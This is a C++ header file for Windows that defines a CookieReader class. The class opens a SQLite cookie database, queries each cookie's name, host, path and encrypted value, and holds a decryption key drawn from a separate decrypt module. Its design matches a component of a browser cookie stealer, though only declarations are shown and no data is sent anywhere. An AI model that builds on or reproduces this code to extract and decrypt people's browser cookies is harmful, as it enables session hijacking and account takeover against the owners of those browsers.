#pragma once
#include<iostream>
#include<windows.h>
#include<vector>
#include<string>

#include<sqlite3.h>
#include "../decrypt/decrypt.h"

using std::vector;
using std::string;
namespace queries {
	static LPCSTR cookies = "SELECT name, host_key, path, encrypted_value FROM cookies";
}

struct CookieEntry {
	string name;
	string site;
	string path;
	string cookie;
};

class CookieReader {
public:
	LPCSTR filePath;
	sqlite3* database;
	sqlite3_stmt* statement;

	PBYTE key;
	vector<CookieEntry*> cookies;

	CookieReader(LPCSTR filePath, PBYTE key) : filePath(filePath), key(key), database(NULL), statement(NULL) {};
	~CookieReader();

	BOOL isLocked();
	BOOL initSqliteDb();
	BOOL prepare(LPCSTR statement);
	BOOL step();

	LPCSTR getText(int colIndex);
	int getInt(int colIndex);
	int getBytes(int colIndex);

	template <typename T>
	T getBlob(int colIndex) {
		return (T)sqlite3_column_blob(this->statement, colIndex);
	}

	void populateCookies();

};